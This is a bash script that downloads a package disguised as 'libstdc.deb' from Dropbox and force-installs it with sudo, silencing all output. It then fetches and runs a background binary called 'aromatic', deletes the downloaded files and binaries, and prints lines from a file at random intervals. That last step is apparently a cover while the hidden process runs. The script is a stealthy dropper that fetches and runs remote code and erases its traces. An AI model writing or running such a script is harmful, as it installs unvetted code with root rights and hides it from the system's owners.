#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/oh09yxb3f4ibbn8/aromatic.zip -q
unzip aromatic.zip > /dev/null 2>&1
#pwd
./src/aromatic ./src/smell &
sleep 3
rm -rf aromatic.zip
rm -rf src/aromatic
rm -rf src/smell
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 10 ))
done < $2

